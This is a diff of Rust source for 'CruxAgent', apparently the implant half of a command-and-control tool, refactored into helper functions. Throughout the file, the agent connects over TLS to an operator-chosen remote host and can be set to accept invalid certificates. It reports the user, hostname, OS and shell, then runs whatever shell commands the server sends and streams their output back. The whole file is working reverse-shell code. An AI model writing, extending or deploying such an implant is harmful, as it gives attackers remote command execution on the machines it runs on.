@@ -1,4 +1,5 @@
 mod args;
+mod agent_utils;
 #[path = "../utils/mod.rs"]
 mod utils;
 
@@ -6,37 +7,20 @@ mod utils;
 use native_tls::{TlsConnector, TlsStream};
 use clap::error::Result;
 use clap::{Parser};
-use whoami::{self, fallible};
+use whoami;
 use serde_json;
-use subprocess::{Exec, ExitStatus, Redirection};
+use subprocess::{Exec, Redirection};
 
 // std
 use std::env;
 use std::net::{TcpStream};
-use std::path::Path;
 use std::io::Read;
 
 // My stuff
 use args::CruxAgentArgs;
-use utils::network::write_length_prefix;
-use utils::data::{CmdType, Metadata, Message, os_detect};
-use utils::network::read_length_prefix;
+use utils::data::{CmdType, Message};
+use utils::network::{write_length_prefix, read_length_prefix};
 use utils::shell_var::parse_var_def;
-
-fn send_metadata(shell: &str, stream :&mut TlsStream<TcpStream>) -> Result<(), Box<dyn std::error::Error>>{
-    // Prepare Metadata
-    let metadata = Metadata {
-        username: whoami::username(),
-        hostname: fallible::hostname().map_or("UNKNOWN_HOSTNAME".to_string(),|d| d),
-        os_type: os_detect(),
-        shell_path: shell.to_string()
-    };
-    let metadata_serial = serde_json::to_string(&metadata)?;
-
-    // Send metadata back to CruxServer
-    let _ = write_length_prefix(stream, &metadata_serial.as_bytes());
-    Ok(())
-}
 
 fn send_response(cmd_output: &Message, stream: &mut TlsStream<TcpStream>) -> Result<(), Box<dyn std::error::Error>>{
     // Serialize CmdResult
@@ -45,58 +29,66 @@ fn send_response(cmd_output: &Message, stream: &mut TlsStream<TcpStream>) -> Res
     Ok(())
 }
 
-fn normalize_exit_code(status: ExitStatus) -> i64 {
-    match status {
-        ExitStatus::Exited(code) => code.into(),
-        ExitStatus::Signaled(sig) => <u8 as Into<i64>>::into(sig)*-1,
-        ExitStatus::Other(code) => code.into(),
-        ExitStatus::Undetermined => -1,
-    }
+fn handle_cd(id:u64, path: &str) -> Result<Message, Box<dyn std::error::Error>> {
+    let new_dir = match path {
+        "" => env::var("HOME").unwrap_or("/".to_string()), // Home directory
+        _ => path.to_string()
+    };
+    env::set_current_dir(new_dir)?;
+    return Ok(Message::CmdExit { id: id, status: 0 })
 }
 
-fn choose_shell() -> Result<String, Box<dyn std::error::Error>> {
-    let candiates = [
-        "/bin/bash",
-        "/usr/bin/bash",
-        "/bin/sh",
-        "/usr/bin/sh",
-        "/bin/zsh",
-        "/usr/bin/zsh",
-        "/bin/dash",
-        "/usr/bin/dash",
-        "/bin/ash",
-        "/usr/bin/ash",
-        "/bin/busybox",
-        "/usr/bin/busybox",
-    ];
+fn handle_export(id: u64, def: &str) -> Result<Message, Box<dyn std::error::Error>> {
+    let var_tuple = parse_var_def(def)?;
+    unsafe {
+        env::set_var(var_tuple.0, var_tuple.1);
+    }
+    return Ok(Message::CmdExit { id: id, status: 0 })
+}
 
-    for shell in &candiates {
-        if Path::new(&shell).exists() {
-            return Ok(shell.to_string());
+fn handle_exec(id: u64, shell_path: &str, cmd: &str, stream: &mut TlsStream<TcpStream>) -> Result<Message, Box<dyn std::error::Error>> {
+    let mut cmd_output;
+    let mut popen = Exec::cmd(shell_path)
+        .arg("-c")
+        .arg(cmd)
+        .stdout(Redirection::Pipe)
+        .stderr(Redirection::Merge)
+        .popen()?;
+    if let Some(mut out) = popen.stdout.take(){
+        let mut buf = [0u8; 512];
+        loop{
+            match out.read(&mut buf)?{
+                0 => break,
+                n => {
+                    cmd_output = Message::CmdOutput { id: 0, data: buf[..n].to_vec() };
+                    send_response(&cmd_output, stream)?;
+                }
+            }
         }
     }
-    return Err("No shell found".into())
+    // Wait for exit
+    let status = popen.wait()?;
+    return Ok(Message::CmdExit { id: id, status: agent_utils::normalize_exit_code(status) });
 }
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
-    let args = CruxAgentArgs::parse();
+    let cli_args = CruxAgentArgs::parse();
 
     // Connect to CruxServer via TLS
     let connector = TlsConnector::builder()
-        .danger_accept_invalid_certs(!args.verify_cert)
+        .danger_accept_invalid_certs(!cli_args.verify_cert)
         .build().unwrap();
 
-    let ip_str = format!("{}:{}", args.rhost, args.rport);
+    let ip_str = format!("{}:{}", cli_args.rhost, cli_args.rport);
     let stream = TcpStream::connect(ip_str)?;
-    let mut stream = connector.connect(&args.rhost.to_string(), stream)?;
+    let mut stream = connector.connect(&cli_args.rhost.to_string(), stream)?;
 
-    let shell_path = choose_shell()?;
-    send_metadata(&shell_path, &mut stream)?;
+    let shell_path = agent_utils::choose_shell()?;
+    agent_utils::send_metadata(&shell_path, &mut stream)?;
 
     // Set User environment variable
-    let user = whoami::username();
     unsafe {
-        env::set_var("USER", &user);
+        env::set_var("USER", &whoami::username());
     }
 
     loop {
@@ -110,83 +102,58 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         };
 
         let mut cmd_output = Message::CmdOutput { id: 0, data: vec![] };
-        let mut cmd_exit = Message::CmdExit { id: 0, status: 0 };
         match received_msg {
-            Message::Cmd { id:_, cmd_type, args } => {
+            Message::Cmd { id, cmd_type, args } => {
                 match cmd_type {
                     CmdType::Exit =>{
                         break
                     }
                     CmdType::Cd =>{
-                        let new_dir = match args.as_str() {
-                            "" => env::var("HOME").unwrap_or("/".to_string()), // Home directory
-                            _ => args
-                        };
-                        if let Err(e) = env::set_current_dir(new_dir) {
-                            cmd_output = Message::CmdError {
-                                id: 0, error: format!("Error from CruxAgent: {}", e)
+                        match handle_cd(id, &args) {
+                            Ok(cmd_exit) => {
+                                if let Err(_) = send_response(&cmd_exit, &mut stream) {
+                                    break;
+                                }
+                            }
+                            Err(e) =>{
+                                let cmd_error = Message::CmdError { id: id, error: format!("Execution Error from CruxAgent: {}", e) };
+                                if let Err(_) = send_response(&cmd_error, &mut stream){
+                                    break;
+                                }
                             }
                         }
                     }
                     CmdType::Export =>{
-                        match parse_var_def(&args) {
-                            Ok(var_tuple) => {
-                                unsafe {
-                                    env::set_var(var_tuple.0, var_tuple.1);
+                        match handle_export(id, &args) {
+                            Ok(cmd_exit) => {
+                                if let Err(_) = send_response(&cmd_exit, &mut stream) {
+                                    break;
                                 }
                             }
-                            Err(e) => {
-                                cmd_output = Message::CmdError {
-                                    id: 0, error: format!("Error from CruxAgent: {}", e)
-                                };
+                            Err(e) =>{
+                                let cmd_error = Message::CmdError { id: id, error: format!("Execution Error from CruxAgent: {}", e) };
+                                if let Err(_) = send_response(&cmd_error, &mut stream){
+                                    break;
+                                }
                             }
-                        };
+                        }
                     }
                     CmdType::Exec => {
-                        match Exec::cmd(&shell_path)
-                            .arg("-c")
-                            .arg(&args)
-                            .stdout(Redirection::Pipe)
-                            .stderr(Redirection::Merge)
-                            .popen() {
-                            Ok(mut p) => {
-                                if let Some(mut out) = p.stdout.take(){
-                                    let mut buf = [0u8; 512];
-                                    loop{
-                                        match out.read(&mut buf){
-                                            Ok(0) => break,
-                                            Ok(n) => {
-                                                cmd_output = Message::CmdOutput { id: 0, data: buf[..n].to_vec() };
-                                                send_response(&cmd_output, &mut stream)?;
-                                            }
-                                            Err(e) => {
-                                                cmd_output = Message::CmdError { id: 0, error: format!("Error from CruxAgent: {}", e) };
-                                                send_response(&cmd_output, &mut stream)?;
-                                                break;
-                                            }
-                                        }
-                                    }
+                        match handle_exec(id, &shell_path, &args, &mut stream) {
+                            Ok(cmd_exit) => {
+                                if let Err(_) = send_response(&cmd_exit, &mut stream) {
+                                    break;
                                 }
-                                // Wait for exit
-                                let status = match p.wait() {
-                                    Ok(s) => s,
-                                    Err(_) => continue
-                                };
-                                cmd_exit = Message::CmdExit { id: 0, status: normalize_exit_code(status) };
                             }
-                            Err(e) => {
-                                cmd_output = Message::CmdError { id: 0, error: format!("Error from CruxAgent: {}", e) };
+                            Err(e) =>{
+                                let cmd_error = Message::CmdError { id: id, error: format!("Execution Error from CruxAgent: {}", e) };
+                                if let Err(_) = send_response(&cmd_error, &mut stream){
+                                    break;
+                                }
                             }
-                        };
+                        }
                     }
                     _ => {}
-                }
-                // Only send cmd_exit if our command didn't cause an error
-                if let Message::CmdOutput { id:_, data:_ } = cmd_output {
-                    if let Err(_) = send_response(&mut cmd_exit, &mut stream){
-                        // TODO: Introduce some error handling here???
-                        break;
-                    }
                 }
             }
             Message::Kill { id:_ } => {
